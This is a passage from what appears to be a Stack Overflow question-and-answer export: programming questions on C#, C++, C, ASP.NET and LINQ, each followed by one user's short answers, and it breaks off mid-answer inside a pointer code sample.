     }
 }

 // Dispatcher logic:
 Dictionary&lt;Type, MessageProcessor&gt; messageProcessors = {
    { typeof(Say), new SayMessageProcessor() },
    { typeof(string), new StringMessageProcessor() }
 }; // properly initialized

 messageProcessors[msg.GetType().GetGenericArguments()[0]].ProcessMessage(msg);
</code></pre>
"
"<p>In the spirit of the <a href=""http://stackoverflow.com/questions/282459/what-is-the-c-equivalent-to-javas-instanceof-and-isinstance"">c#</a> question..</p>

<p>What is the equivalent statements to compare class types in VB.NET?</p>
","33708","","<pre><code>TypeOf obj Is MyClass
</code></pre>
"
"<p>I'm dealing with the following issue: a (third-party) software (<a href=""http://www.neurobs.com/"" rel=""nofollow"">Software A</a>
) we are using extensively allows the programming of what it calls 'extensions' using a Component Object Model (COM) interface (actually several interfaces). It provides the MIDL files for these interfaces as well as a 'project template' for Visual C++ as part of an SDK (IDL files, headers and interfaces are already there, only the implementations for the interface functions are missing). To be comaptible, all extensions have to conform to (i.e. must implement) the given COM interface structure.</p>

<p>However, as my familiarity with C++ is rather limited I was hoping to implement the COM in C# and .NET - on the other hand, the pre-defined interfaces make heavy use of pointers and custom data structures, so I'm wondering if I'm not better off implemementing the interfaces in their native C++ rather than trying to recreate everything in C#.</p>

<p>A little more background maybe: the ultimate goal is to control a piece of custom hardware (via USB)  from inside Software A. I have already written a small .NET app wrapping the driver (another third party software) using DLLimport, which was surprisingly painless. In other words, the COM object I am trying to build is essentially a bridge between (third-party) Software A and (third-party) device driver B, which must conform to the interface specifications given by A.</p>

<p><hr /></p>

<p>sample MIDL code:</p>

<blockquote>[ id(0x00000004)]<br>
  HRESULT GetWaveData([in] BSTR name, [out] IWaveData ** data );<br>
  [ id(0x00000005)]<br>
  HRESULT GetImageData([in] BSTR name, [out] IImageData ** data, [out] Palette * Palette );<br>
  [ id(0x00000006)]<br>
  HRESULT SetVariable([in] BSTR name, [in] IVariableData * variable );
</blockquote>
","33708","","<p>It's not really possible to answer this question without knowing the problem completely. But generally, I would go with the C++ route. By adding CLR to the world, you'll have to deal with interop issues and possibly handle with nasty pointer issues (since the nature of it is dealing with low level hardware related stuff) in C#. As a result, probably, your real choices are an unclean C# source or going with C++. I guess I'd choose the latter.</p>
"
"<p>I just came across something pretty weird to me : when you use the Equals() method on a value type (and if this method has not been overriden, of course) you get something <em>very very</em> slow -- fields are compared one to one using reflection ! As in :</p>

<pre><code>public struct MyStruct{
   int i;
}

   (...)

   MyStruct s, t;
   s.i = 0;
   t.i = 1;
   if ( s.Equals( t ))   &lt;= s.i will be compared to t.i via reflection here.
      (...)
</code></pre>

<p>My question : why does the C# compiler do not generate a simple method to compare value types ? Something like (in MyStruct's definition) :</p>

<pre><code>   public override bool Equals( Object o ){
      if ( this.i == o.i )
         return true;
      else
         return false;
   }
</code></pre>

<p>The compiler knows what are the fields of MyStruct at compile time, why does it wait until runtime to enumerate MyStruct fields ?</p>

<p>Very strange to me.</p>

<p>Thanks :)</p>

<p><strong>ADDED</strong> : Sorry, I just realize that, of course, <code>Equals</code> is not a language keyword but a runtime method... The compiler is completely unaware of this method. So it make sens here to use reflection.</p>
","33708","","<p>It doesn't use reflection <em>when it doesn't need to</em>. It just compare values bit by bit in case the <code>struct</code> if it can do so. However, there if any of the <code>struct</code> members (or members of members, any descendants) override <code>object.Equals</code> and provide its own implementation, obviously, it can't rely on bit-by-bit comparison to calculate the return value. </p>

<p>The reason it's slow is that the parameter to <code>Equals</code> is of type <code>object</code> and value types have to be boxed to be treated as an <code>object</code>. Boxing involves allocating memory on the heap and memory copying the value type to that location. </p>

<p>You could manually provide an overload for the <code>Equals</code> method that takes your own <code>struct</code> as parameter to prevent boxing:</p>

<pre><code>public bool Equals(MyStruct obj) {
     return obj.i == i;
}
</code></pre>
"
"<p>Is it possible to make one master page simply include another master page?</p>

<p>I have three master pages, which have converged in content, and I want to make 2 of them point to the third, so that the content is not replicated, but leaving them in so that they can change easily in the future if they have to.</p>
","33708","","<p>Yes, what you need is called <strong>nested master pages</strong>. Just set the <code>MasterPageFile</code> in the <code>&lt;%@ Master %&gt;</code> directive of child master pages to the parent one.</p>

<p>Main.Master:</p>

<pre><code>&lt;%@ Master Language=""C#"" %&gt;

.... shared content ....
&lt;asp:ContentPlaceHolder ID=""C"" runat=""server"" /&gt;
</code></pre>

<p>First.Master:</p>

<pre><code>&lt;% Master Language=""C#"" MasterPageFile=""Main.Master"" %&gt;

&lt;asp:Content runat=""server"" ContentPlaceHolderID=""C""&gt;
   .... Some content ....
   &lt;asp:ContentPlaceHolder ID=""AnotherPlaceholder"" runat=""server"" /&gt;
&lt;/asp:Content&gt;
</code></pre>

<p>Second.Master:</p>

<pre><code>&lt;% Master Language=""C#"" MasterPageFile=""Main.Master"" %&gt;

&lt;asp:Content runat=""server"" ContentPlaceHolderID=""C""&gt;
   .... Some other content ....
   &lt;asp:ContentPlaceHolder ID=""AnotherPlaceholder"" runat=""server"" /&gt;
&lt;/asp:Content&gt;
</code></pre>
"
"<p>Does anyone use the Windows 7 preview release for .NET development?</p>

<p>Do things like SQL Server Express 2005/2008, VS.NET 2005/2008 work on it fine?<br />
How about IIS?</p>

<p>Any other things I should be taking into consideration?</p>
","33708","","<p>I've been using Windows 7 as my primary operating system since its beta. It works pretty well with Visual Studio 2008 SP1, IIS 7.5, SQL Server 2008 SP1. I haven't had any problems so far.</p>
"
"<p>I had an interview question that asked me for my 'feedback' on a piece of code a junior programmer wrote. They hinted there may be a problem and said it will be used heavily on large strings. </p>

<pre><code>public string ReverseString(string sz)
{
    string result = string.Empty;
    for(int i = sz.Length-1; i&gt;=0; i--)
    {
      result += sz[i]
    }
    return result;
}
</code></pre>

<p>I couldn't spot it. I saw no problems whatsoever. 
In hindsight I could have said the user should resize but it looks like C# doesn't have a resize (i am a C++ guy).</p>

<p>I ended up writing things like use an iterator if its possible, [x] in containers could not be random access so it may be slow. and misc things. But I definitely said I never had to optimize C# code so my thinking may have not failed me on the interview.</p>

<p>I wanted to know, what is the problem with this code, do you guys see it?</p>

<p>-edit-</p>

<p>I changed this into a wiki because there can be several right answers.
Also i am so glad i explicitly said i never had to optimize a C# program and mentioned the misc other things. Oops. I always thought C# didnt have any performance problems with these type of things. oops.</p>
","33708","","<p>Since strings are immutable, each <code>+=</code> statement will create a new string by copying the string in the last step, along with the single character to form a new string. Effectively, this will be an O(n<sup>2</sup>) algorithm instead of O(n).</p>

<p>A faster way would be (O(n)):  </p>

<pre><code>// pseudocode:
static string ReverseString(string input) {
    char[] buf = new char[input.Length];
    for(int i = 0; i &lt; buf.Length; ++i)
       buf[i] = input[input.Length - i - 1];
    return new string(buf);
}
</code></pre>
"
"<p>For example, if I have the following:</p>

<pre><code>void foo(string* s)
{
    bar(s); // this line fails to compile, invalid init. error
}

void bar(const string&amp; cs)
{
    // stuff happens here
}
</code></pre>

<p>What conversions do I need to make to have the call the bar succeed?</p>
","33708","","<p>Change it to:</p>

<pre><code>bar(*s);
</code></pre>
"
"<p><br></p>

<p>1) I assume profile data is automatically retrieved only for current user, while profile data for other users must be retrieved manually?  </p>

<p><br></p>

<p>2)
Iâm not sure what the following quote is trying to convey:</p>

<blockquote>
  <p>If you define a profile in web.config file that doesnât exist in the serialized profile information, the ProfileModule will just use the default value</p>
</blockquote>

<ul>
<li>I assume âserialized profile informationâ refers to profile data stored in database? If so, then I assume quote refers to situation where code accesses for the first time Profile object and Asp.Net tries to retrieve complete profile data? And if there isnât any profile data stored in DB for that particular profile, ProfileModule will return default values for profile-properties?</li>
</ul>

<p><br></p>

<p>thanx</p>
","33708","","<ol>
<li>Yes. The <code>Profile</code> property of the <code>Page</code> class returns the profile data for the current user.</li>
<li>Yes.</li>
</ol>
"
"<pre><code>public DerivedClass(string x) : base(x)
{
  x=""blah"";
}
</code></pre>

<p>will this code call the base constructor with a value of x as ""blah""?</p>
","33708","","<p>No, <code>base</code> call we be performed before executing the constructor body:</p>

<pre><code>//pseudocode (invalid C#):
public Constructor(string x) {
   base(x);
   x = ""blah"";
}
</code></pre>
"
"<p>I have 2 classes Test(Base)and Program(child). Now I am facing some problem while downcasting.</p>

<pre><code>        Test t = new Program();// upcasting-works
        Program p = (Program)t;//Downcasting-works
        Program q = (Program)new Test();//Downcasting -throws exception.
</code></pre>

<p>I want to know why its throwing exception? May b its very basic, but somehow I am not getting.
Is it for that new object?</p>

<p>Thanks.</p>
","33708","","<p>Every Square is a Rectangle but not vice versa. Similarly, every instance of a derived class is a valid instance of the base class but not vice versa. In your example, every <code>Program</code> is a <code>Test</code> but not all <code>Test</code>s are <code>Program</code>s.</p>
"
"<p>I would like to index a list with another list like this</p>

<pre><code>L = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h']
Idx = [0, 3, 7]
T = L[ Idx ]
</code></pre>

<p>and T should end up being a list containing ['a', 'd', 'h'].</p>

<p>Is there a better way than</p>

<pre><code>T = []
for i in Idx:
    T.append(L[i])

print T
# Gives result ['a', 'd', 'h']
</code></pre>
","33708","","<pre><code>T = map(lambda i: L[i], Idx)
</code></pre>
"
"<p>I am trying to persist the C# carraige return (\r\n) directive in a app settings file.
The designer however is escaping the sequence to (\r\n) , a behaviour I don't want.</p>

<p>I have manually modified the default value attritube in the settings.designer file ,but this only works for the life time of the application and then reverts to the escaped sequence.</p>

<p>Is there any way to store the literal in the settings file?</p>
","33708","","<p>I don't think there's an easy way to do that in VS directly. You can write the text in notepad with actual newline characters and copy &amp; paste it to the field in the designer.</p>
"
"<p>I need a way for a single variable to represent two kinds of objects derived from the same base class.</p>

<p>It's kinda hard to describe but I'll try the best:</p>

<p>Say the base class:</p>

<pre><code>class Rectangle
{
   float w;
   float h;
   const float area() {return w*h;}
};
</code></pre>

<p>And the two derived classes:</p>

<pre><code>class Poker : Rectangle
{
    int style;  // Diamond, Club, ....
    int point;  // A~10, J, Q, K
};

class BusinessCard : Rectangle
{
    string name;
    string address;
    string phone;
};
</code></pre>

<p>Now is it possible to declare an object, which could be either a poker or a business-card?</p>

<p>'cuz the usage below is illegal:</p>

<pre><code>Rectangle* rec;
rec = new Poker();
delete rec;
rec = new BusinessCard();
</code></pre>

<p>Polymorphism might be a way but since it's only good for changing base-class' member attributes, I need this object to be able to represent exactly either of the derived objects.</p>

<p>EDIT:</p>

<p>Thanks for the all the answers. The public inheritance , the virtual destructor and even the boost::variant typedef are all fantastic hints.</p>
","33708","","<p>You can do that. The problem is the inheritance modifier for classes is <code>private</code>. <a href=""http://stackoverflow.com/questions/656224/when-should-i-use-c-private-inheritance"">Most of the time, <code>private</code> inheritance is not what you want to use</a>. Instead, declare it explicitly as <code>public</code>:</p>

<pre><code>class Rectangle
{
   float w;
   float h;
   const float area() {return w*h; }; // you missed a semicolon here, btw
   virtual ~Rectangle() { } // to make `delete` work correctly
};

class Poker : public Rectangle // note the public keyword
{
    int style;  // Diamond, Club, ....
    int point;  // A~10, J, Q, K
};

class BusinessCard : public Rectangle 
{
    string name;
    string address;
    string phone;
};
</code></pre>

<p>Then your code snippet should work.</p>
"
"<p>I need to process the bytes[] when i get from external application.  The external application is also done in c# and they send the bytes thru UDP. They are sending the bytes converted from struct which is stated below :
<hr /></p>

<pre><code>public struct DISPATCH_MESSAGE
{
    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
    public char[] federation_name; // Units: nil     Range: nil
}
</code></pre>

<p><hr /></p>

<p>So, when i get the bytes, i need to take out the char[] inside that, 
and get the string out of that char[].</p>

<p>I hope my explanation is clear. i am new to this kind of unmanaged coding.
Please help me on this.
Its urgent. Thanks.</p>
","33708","","<p>Probably you should declare it as <code>ByValTStr</code> (depending on the nature of the string, it might be different):</p>

<pre><code> [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
 public struct DISPATCH_MESSAGE{ 
    [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 16)]   
    public string federation_name; 
 }
</code></pre>

<p><strong>UPDATE:</strong> If it's already giving out a <code>char[]</code>, it's probably doing the necessary conversion (includes handling encoding) correctly, so I think you'd just need:</p>

<pre><code>string str = new string(instance.federation_name);
</code></pre>
"
"<p>I created an instance of MethodInfo:</p>

<pre><code>MethodInfo theMethod = typeof(Reciever).GetMethod(""methodName"", parameterTypes);
</code></pre>

<p>Now I want to know if theMethod's return type is void. How?</p>
","33708","","<p>Easy:</p>

<pre><code>theMethod.ReturnType == typeof(void)
</code></pre>
"
"<p>Suppose I have a string like this:</p>

<pre><code>one two three ""four five six"" seven eight
</code></pre>

<p>and I want to convert it to this:</p>

<pre><code>one,two,three,""four five six"",seven,eight
</code></pre>

<p>What's the easiest way to do this in C#?</p>
","33708","","<pre><code> static string Space2Comma(string s)
 {
    return string.Concat(s.Split('""').Select
        ((x, i) =&gt; i % 2 == 0 ? x.Replace(' ', ',') : '""' + x + '""').ToArray());
 }
</code></pre>
"
"<p>One of our user did an insert statement in development server. The insert worked fine. However, when the same insert statement is executed in production server, he encountered the error below:</p>

<pre><code>Error:.Net SqlClient Data Provider
Error Message: The conversion of char data type to a datetime data type resulted in an out-of-range
datetime value.
The statement has been terminated.
</code></pre>

<p>The insert statement is below:</p>

<pre><code>Insert into tbl_SeatWave_customers 
(Title, FirstName, Lastname, EmailAddress, HomeTelephone, Address1, Address2, Address3,
 Town, County, Postcode, BuyerOrSeller, OrderID, ListingID, BestCallDateTimeFrom,
 bestcalldatetimeto, FAQAsked, Comments, CallOutcome, Spare1, Spare2) 
Values('Mr', 'Darren', 'Piper', 'bazzt27@hotmail.com', '07825758328', '7 RUSSELL ROAD',
 '', '', '', 'CLWYD', 'LL18 3BS', 'Other', '', '', '19/06/2009', '12:00', '',
 'Callers tickets have not yet arrived.', 'Resolved','Yes', '')
</code></pre>

<p>The table tbl_SeatWave_customers has the following structure:</p>

<pre><code>COLUMN_NAME         DATA_TYPE   COLUMN_DEFAULT
NUID            bigint	    NULL
CallDateTime        datetime    (getdate())
Title           nvarchar	NULL
FirstName           nvarchar	NULL
LastName            nvarchar	NULL
EmailAddress    nvarchar	NULL
HomeTelephone   nvarchar	NULL
MobileTelephone nvarchar	NULL
WorkTelephone   nvarchar	NULL
Address1            nvarchar	NULL
Address2    nvarchar	        NULL
Address3    nvarchar	        NULL
Address4    nvarchar	        NULL
Town    nvarchar	        NULL
County  nvarchar	        NULL
Postcode    nvarchar	        NULL
BuyerOrSeller   nvarchar	NULL
OrderID nvarchar	NULL
ListingID   nvarchar	NULL
BestCallDateTimeFrom    datetime	NULL
BestCallDateTimeTo  datetime	NULL
FAQAsked    nvarchar	NULL
Comments    nvarchar	NULL
Spare1  nvarchar	NULL
Spare2  nvarchar	NULL
Spare3  nvarchar	NULL
Spare4  nvarchar	NULL
Spare5  nvarchar	NULL
CallOutcome nvarchar	NULL
</code></pre>

<p>My question what is the cause of this error and what is the resolution to fix it?</p>
","33708","","<p>The problem is with <code>`19/06/2009'</code> which is specified in <code>DD/MM/YYYY</code> but your SQL Server instance expects it as <code>MM/DD/YYYY</code>.</p>
"
"<p>I have an array of bytes and i want to determine if the contents of this array of bytes exists within another larger array as a continuous sequence. What is the simplest way to go about doing this?</p>
","33708","","<p>The naive approach is:</p>

<pre><code>public static bool IsSubsetOf(byte[] set, byte[] subset) {
    for(int i = 0; i &lt; set.Length &amp;&amp; i + subset.Length &lt;= set.Length; ++i)
        if (set.Skip(i).Take(subset.Length).SequenceEqual(subset))
            return true;
    return false;
}
</code></pre>

<p>For more efficient approaches, you might consider more advanced string matching algorithms like <a href=""http://en.wikipedia.org/wiki/Knuth-Morris-Pratt_algorithm"" rel=""nofollow"">KMP</a>.</p>
"
"<p>Given a public instantiation of a class in WinForm1, I attempt to open WinForm2 and eliciting DB parms do a query the results of which I would like use to fill the class instance in WinForm1.  However, I cannot figure out how to access the class instance in WinForm1 from WinForm2.</p>

<p>The class instance in WinForm1 is coded as a private member / public property:</p>

<pre><code>private theClass _classInstance;
public theClass ClassInstance {get; set;}
</code></pre>

<p>I am calling WinForm2 as a modal form.</p>

<pre><code>WinForm2 wf2 = new WinForm2();
wf2.ShowDialog(this);
</code></pre>

<p>Is there way I can refer to ClassInstance (modifying its value) while in wf2 ??</p>
","33708","","<p>You could pass a reference to the parent form in the constructor or as a property to the child form or hold the reference in a <code>static</code> field.</p>

<pre><code>class WinForm2 : Form {
     WinForm1 parentForm;
     public WinForm2(WinForm1 parentForm) {
         this.parentForm = parentForm;
         // ....
     }

     // Use `parentForm.ClassInstance` here.
}


WinForm2 wf2 = new WinForm2(this);
wf2.ShowDialog(this);
</code></pre>

<p>By the way, when you're declaring an <em>automatic property</em> like the one you specified, you shouldn't manually create a backing field. The compiler takes care of that for you.</p>
"
"<p>I have a byte array that contains 6 bytes last 2 represents the port number while searching for a way two convert these last to bytes to a port number i have come across this snippet,</p>

<pre><code>

        	int port = 0;
    	port |= peerList[i+4] & 0xFF;
    	port &lt;&lt;= 8;
    	port |= peerList[i+5] & 0xFF;

</code></pre>

<p>it works but i need some clarification as to how it works?</p>
","33708","","<blockquote>
<pre><code>  =======================
  |  byte 5  |  byte 6  |
  |----------|----------|
  | 01010101 | 01010101 |
  =======================
</code></pre>
</blockquote>

<p>Basically, it takes byte #5, shift is 8 bits to the left resulting in <code>0101010100000000</code> and then uses the bitwise or operator to put the byte 6 in the place of zeros.</p>
"
"<p>I'm just getting started using Linq to XML and I have a simple document with records like this:</p>

<pre><code>&lt;record date=""6/27/2002"" symbol=""DG"" price=""15.00"" /&gt;
</code></pre>

<p>I want a list of distinct symbols as strings, in order.</p>

<p>This gives me an unordered list of all attributes, but I'm stuck</p>

<pre><code>var query =
  from e in xml.Elements()
  select e.Attribute(""symbol"");
</code></pre>

<p>How can this be modified to give me what I want?</p>
","33708","","<p>I'd do that with lambda syntax:</p>

<pre><code>var query = xml.Elements()
               .Select(e =&gt; (string)e.Attribute(""symbol""))
               .Distinct()
               .OrderBy(x=&gt;x);
</code></pre>
"
"<p>I came across some codes in the following way</p>

<pre><code>//file.c  
#include &lt;stdlib.h&gt;

void print(void){

    printf(""Hello world\n"");
}
</code></pre>

<p>and </p>

<pre><code>//file main.c  
#include &lt;stdio.h&gt;
#include ""file.c""

int main(int argc, char *argv[]){

    print();

    return EXIT_SUCCESS;
}
</code></pre>

<p>Is there any flaw in this kind of programming style? I am not able to make out the flaw although I feel so, because somewhere I read that separating the implementation into *.h and *.c file helps compiler check for consistency. I don't understand what is meant by consistency.<br />
I would be deeply thankful for some suggestions.</p>

<p>--thanks</p>
","33708","","<p>It's a common expectation that the compiler should compile <code>.c</code> files. <code>.h</code> files are not directly given to the compiler. They are usually only included within <code>.c</code> files. </p>

<p>Thus, your code is expected to compile by something like:</p>

<pre><code>gcc main.c file.c
</code></pre>

<p>rather than only <code>gcc main.c</code>. That command would fail in the linking stage as it sees duplicate symbols.</p>
"
"<p>I want to pass 2 arrays to a function in Java and have them sorted in the calling function.  How do i use a function to accomplish that? </p>

<p>I could have the function return an object with 2 arrays, but is there a non object-oriented solution to this? </p>

<p>EDIT : I this particular situation I cant use the inbuilt Array.sort function in Java. Lets say the 2 arrays are height and weight. They are of the same length, and the same index correspond to the same person's height and weight on both arrays. I want to sort the height array in ascending order, while sorting the weight array corresponding to the height array. So using the sort function would mess up the relations between the 2 arrays.</p>
","33708","","<p>When you pass an array to a function, it's not copied. Just the reference of it is copied and passed to the function which will point to the same location. You just need to sort the arrays in-place.</p>

<p>EDIT: To solve the actual sorting problem, you can use any sorting algorithm to sort <code>height</code> array. The only difference is that when you're swapping two elements in <code>height</code> sorting process, you should also swap the corresponding elements in <code>weight</code> array.</p>
"
"<p>Is it a separate branch of Mac OS X? If so, does the code get synchronized with 10.6? </p>

<p>(that might be somewhat a separate question, but why couldn't they make a Mobile Leopard rather then separate OS for iPhone?) </p>

<p>Please do try to respect the Apple's NDAs while answering.</p>

<p><strong>Update</strong>: I start to get the rough idea:</p>

<ul>
<li>the open source kernel, Darwin, roughly the same
<ul>
<li>note that Darwin includes <code>mDNSResponder</code> and <code>launchd</code></li>
</ul></li>
<li>UI implements similar ideas in different contexts with different APIs </li>
<li><a href=""http://en.wikipedia.org/wiki/Webkit"" rel=""nofollow"">Webkit</a>, I guess, is the same</li>
<li>what about Core Audio/Video/Quicktime, Spotlight and other services?</li>
</ul>
","33708","","<p>The <a href=""http://en.wikipedia.org/wiki/Darwin%5F%28operating%5Fsystem%29"" rel=""nofollow"">Darwin</a> core (underlying UNIX-like system) is more or less the same code base (with some differences) adapted for ARM architecture. Higher OS layers (e.g. Cocoa Touch), while probably do share some code with their desktop counterpart, are specifically written for the iPhone platform which is significantly different from desktop in terms of screen size, processing power, storage and most importantly, user interface.</p>

<p><strong>Update:</strong></p>

<p>I disagree that UI is a completely different library though. While it's a separate set of APIs (<code>UIKit</code> in iPhone OS and <code>AppKit</code> in Mac OS X), the fundamental ideas are pretty much the same and are coming from their NeXTSTEP heritage. Core Audio is very similar on the surface to its desktop version but I guess the implementation might have some hardware optimizations to better suit iPhone hardware and usage scenarios. Networking is handled at the low level by Darwin which is the same across both OSes and at higher level by Cocoa APIs which is also pretty much identical.</p>

<p>Personally, I think iPhone OS is ""Mobile Leopard"" as much as it made sense. While Windows Embedded CE is more similar to desktop Windows at the API level, the underlying core is very different. In that sense, Mac OS X and iPhone OS are much more similar. However, it didn't make sense to use an identical set of UI APIs for both as their characteristics are very different at that level. They didn't want to sacrifice iPhone UI at any cost. It wasn't supposed to bring a desktop experience to the phone but to create a great experience really suited for such a device. I believe iPhone has succeeded in reaching that goal so Apple has made the correct decision in going with this route ;)</p>
"
"<p>I've searched around and haven't really found a clear answer as to when you'd want to use <code>.First</code> and when you'd want to use <code>.FirstOrDefault</code> with LINQ.</p>

<ul>
<li><p>When would you want to use <code>.First</code>? Only when you'd want to catch the exception if no results where returned?</p>

<pre><code>var result = List.Where(x =&gt; x == ""foo"").First();
</code></pre></li>
<li><p>And when would you want to use <code>.FirstOrDefault</code>? When you'd always want the default type if no result?</p>

<pre><code>var result = List.Where(x =&gt; x == ""foo"").FirstOrDefault();
</code></pre></li>
<li><p>And for that matter, what about Take?</p>

<pre><code>var result = List.Where(x =&gt; x == ""foo"").Take(1);
</code></pre></li>
</ul>
","33708","","<p>First of all, <code>Take</code> is a completely different method. It returns an <code>IEnumerable&lt;T&gt;</code> and not a single <code>T</code>, so that's out. </p>

<p>Between <code>First</code> and <code>FirstOrDefault</code>, you should use <code>First</code> when you're sure that an element exists and if it doesn't, then there's an error. </p>

<p>By the way, if your sequence contains <code>default(T)</code> elements (e.g. <code>null</code>) and you need to distinguish between being empty and the first element being <code>null</code>, you can't use <code>FirstOrDefault</code>.</p>
"
"<p>I'm trying to make my own webbrowser with C#, 
my wpf application seems to be correct. but it's still missing something.
the webpage doesn't appear. :s
Does someone have an idea?</p>

<p>Here's my code in C# :</p>

<pre><code>public partial class Window1 : Window
{
    public Window1()
    {
        InitializeComponent();
    }

    private void textBox1_TextChanged(object sender, TextChangedEventArgs e)
    {
    }

    private void button1_Click(object sender, RoutedEventArgs e)
    {
        WebBrowser web = new WebBrowser();
        web.NavigateToString (textBox1.Text);
    }
</code></pre>

<p>Thanks for your help.</p>
","33708","","<p>As I understand, you are instantiating a new <code>WebBrowser</code> control in code and you aren't adding it as a control to the actual form. You'd better add the control in design view and just do the method call in the code.</p>
"
"<p>I am trying to programatically download a file through clicking a link, on my site (it's a .doc file sitting on my web server). This is my code:</p>

<pre><code>string File = Server.MapPath(@""filename.doc"");
string FileName = ""filename.doc"";

if (System.IO.File.Exists(FileName))
{

    FileInfo fileInfo = new FileInfo(File);
    long Length = fileInfo.Length;


    Response.ContentType = ""Application/msword"";
    Response.AddHeader(""Content-Disposition"", ""attachment; filename="" + fileInfo.Name);
    Response.AddHeader(""Content-Length"", Length.ToString());
    Response.WriteFile(fileInfo.FullName);
}
</code></pre>

<p>This is in a buttonclick event handler. Ok I could do something about the file path/file name code to make it neater, but when clicking the button, the page refreshes. On localhost, this code works fine and allows me to download the file ok. What am I doing wrong?</p>

<p>Thanks</p>
","33708","","<p>Oh, you shouldn't do it in button click event handler. I suggest moving the whole thing to an HTTP Handler (<code>.ashx</code>) and use <code>Response.Redirect</code> or any other redirection method to take the user to that page. <a href=""http://stackoverflow.com/questions/873207/force-download-of-a-file-on-web-server-asp-net-c/873228#873228"">My answer to this question provides a sample</a>.</p>

<p>If you still want to do it in the event handler. Make sure you do a <code>Response.End</code> call after writing out the file.</p>
"
"<p>I'm going though a computers system course and I'm trying to establish, <em>for sure</em>, if my AMD based computer is a little endian machine? I believe it is because it would be Intel-compatible. </p>

<p>Specifically, my processor is an AMD 64 Athlon x2.</p>

<p>I understand that this can matter in C programming. I'm writing C programs and a method I'm using would be affected by this. I'm trying to figure out if I'd get the same results if I ran the program on an Intel based machine (assuming that <strong>is</strong> little endian machine).</p>

<p>Finally, let me ask this: Would any and all machines capable of running Windows (XP, Vista, 2000, Server 2003, etc) and, say, <a href=""http://www.ubuntu.com/getubuntu/download"">Ubuntu Linux desktop</a> be little endian? </p>

<p>Thank You,<br>
Frank</p>
","33708","","<p>All x86 and x86-64 machines (which is just an extension to x86) are little-endian.</p>

<p>You can confirm it with something like this:</p>

<pre><code>main() {
   int a = 0x12345678;
   unsigned char *c = (unsigned char*)(&amp;a);
   if (*c == 0x78)
      printf(""little-endian\n"");
   else
      printf(""big-endian\n"");
}
</code></pre>
"
"<p>Why this code does not write 0 as a last element but 18446744073709551615?
(compiled with g++)</p>

<pre><code>#include &lt;iostream&gt;

using namespace std;
int main(){
    unsigned long long x = (unsigned long long) (-1);
    for(int i=0; i &lt;= 64; i++)
    	cout &lt;&lt; i &lt;&lt; "" "" &lt;&lt; (x &gt;&gt; i) &lt;&lt; endl;
    cout &lt;&lt; (x &gt;&gt; 64) &lt;&lt; endl;
    return 0;
}
</code></pre>
","33708","","<p>When you shift a value by more bits than word size, it <strong>usually</strong> gets shifted by <code>mod word-size</code>. Basically, shifting it by 64 means shifting by 0 bits which is equal to no shifting at all. You shouldn't rely on this though as it's not defined by the standard and it can be different on different architectures.</p>
"
"<p>I have two methods in C# 3.5 that are identical bar one function call, 
 in the snippet below, see clientController.GetClientUsername vs clientController.GetClientGraphicalUsername </p>

<pre><code>    private static bool TryGetLogonUserIdByUsername(IGetClientUsername clientController, string sClientId, out int? logonUserId)
    {
        string username;
        if (clientController.GetClientUsername(sClientId, out username))
        {
		   // ... snip common code ...
        }

        return false;
    }

    private static bool TryGetLogonUserIdByGraphicalUsername(IGetClientUsername clientController, string sClientId, out int? logonUserId)
    {
        string username;
        if (clientController.GetClientGraphicalUsername(sClientId, out username))
        {
		   // ... snip common code ...
        }

        return false;
    }
</code></pre>

<p>Is there a way (delegates, lamda's ?) that I can pass in which method on clientController I want to call?</p>

<p>Thanks!</p>
","33708","","<p>While you can pass a delegate as a parameter, I suggest going with a different route. Encapsulate the body of the <code>if</code> statement which involves common code in another function and call that one in both functions.</p>

<p>Visual Studio has a ""Refactor <code>-&gt;</code> Extract Method"" feature in the context menu. You can just fill in one of the bodies, select the body and use that feature to extract a method out of it automatically.  </p>
"
"<p>i think the title is a little cryptic, here's what i want to do...</p>

<p>i have in my tabel two datetime fields. 
Now i want to select the rows where the largest (ie the most far in the future) date is larger than 'today'</p>

<pre><code>few examples: (today is 6-22)
date1: null, date2: null : no match, all lower than now
date1: null, date2: 5-31: no match, all lower than now
date1: null, date2: 6-23: match, 6-23 is larger than now
date1: 5-31, date2: 7-23: match, 6-23 is larger than now
date1: 7-21, date2: 1-23: match, 7-21 is larger than now
date1: 7-21, date2: null: match, 7-21 is larger than now
</code></pre>

<p>so in sort of pseudo code:</p>

<p>select * from table where (max(date2, date2)) > now</p>

<p>Regards,
Michel</p>
","33708","","<p>Is this what you want (I converted your SQL):</p>

<pre><code>from row in table
where (row.Date1 != null &amp;&amp; row.Date1 &gt; DateTime.Now) || 
      (row.Date2 != null &amp;&amp; row.Date2 &gt; DateTime.Now)
select row
</code></pre>
"
"<p>I'm having trouble understanding the following bit of code that I was hoping would create an array on the heap and fill it with the characters 9 down to 0 (I know I could just index the array like a normal stack array with [] notation to do this but I'm doing it this way to try to understand pointers in more depth):</p>

<pre><code>int *ptrHeapArray = new int[10]; 

    for(int f=9; f&gt;=0 ;f--)
    {
    	*ptrHeapArray = f;
    	ptrHeapArray++;
    }
    for(int f=0; f&lt;10; f++)
    	cout &lt;&lt; ptrHeapArray[f]  &lt;&lt; ""\n"";
</code></pre>

<p>It prints out compleletly unexpected values.</p>

<p>As I understand the above, the 'new' command creates an array on the heap and sends me back a pointer to the address where the array is. Since the pointer I assign (ptrHeapArray) is of int size I assumed I could use pointer post incrementing to navigate through the array. However the results indicate that my assumptions are wrong.</p>

<p>This got me to thinking that perhaps the pointer passed back by the 'new' keyword is just a pointer to the whole array and can't be used to step through the array for some reason.
So I tried creating another pointer to the pointer returned by the 'new' keyword and used that to do my array population:</p>

<pre><code>int *ptrHeapArray = new int[10];  //array to hold FRANK data in 32 bit chunks
int *ptrToHeapArrayPointer = ptrHeapArray;

for(int f=9; f&gt;=0 ;f--)
{
	*ptrToHeapArrayPointer = f;
	ptrToHeapArrayPointer++;
}
for(int f=0; f&lt;10; f++)
	cout &lt;&lt; ptrHeapArray[f]  &lt;&lt; ""\n"";
</code></pre>

<p>This worked fine.
Can anyone explain to me why I had to do this and couldn't just have used the pointer passed backed to me by the 'new' keyword?</p>

<p>Thanks</p>
","33708","","<p>You are modifying the pointer in code. After the first loop in the first snippet, the pointer will point to the end of the array rather than the beginning. To make things clearer, this would work too (not suggested but demonstrates the behavior):</p>

<pre><code>int *ptrHeapArray = new int[10]; 

for(int f=9; f&gt;=0 ;f--)
{
    *ptrHeapArray = f;
    ptrHeapArray++;
}

